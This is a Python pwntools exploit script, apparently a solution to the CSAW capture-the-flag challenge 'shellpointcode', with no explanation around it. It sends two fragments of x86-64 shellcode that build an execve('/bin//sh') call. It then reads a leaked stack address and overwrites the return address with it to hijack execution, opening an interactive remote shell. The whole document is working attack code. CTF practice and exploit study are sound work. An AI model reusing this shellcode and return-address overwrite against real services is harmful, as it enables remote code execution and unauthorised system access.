from pwn import *
import binascii

r = remote('pwn.chal.csaw.io', 9005)
#r = process('./shellpointcode')
#gdb.attach(r)

print(r.recvrepeat(1))
r.sendline('\x57\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05')
print(r.recvline())
r.sendline('\x31\xC0\x50\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\xeb\x11')
print(r.recvline())
data = r.recvline()
print(data)
print(r.recvline())
print(r.recvline())

addr = binascii.unhexlify(data[13:-1])[::-1]
c = chr(ord(addr[0]) + 8)
test = 'ZZZZZZZZZZZ' + c + addr[1:] + '\x00\x00'
r.sendline(test)
r.interactive()
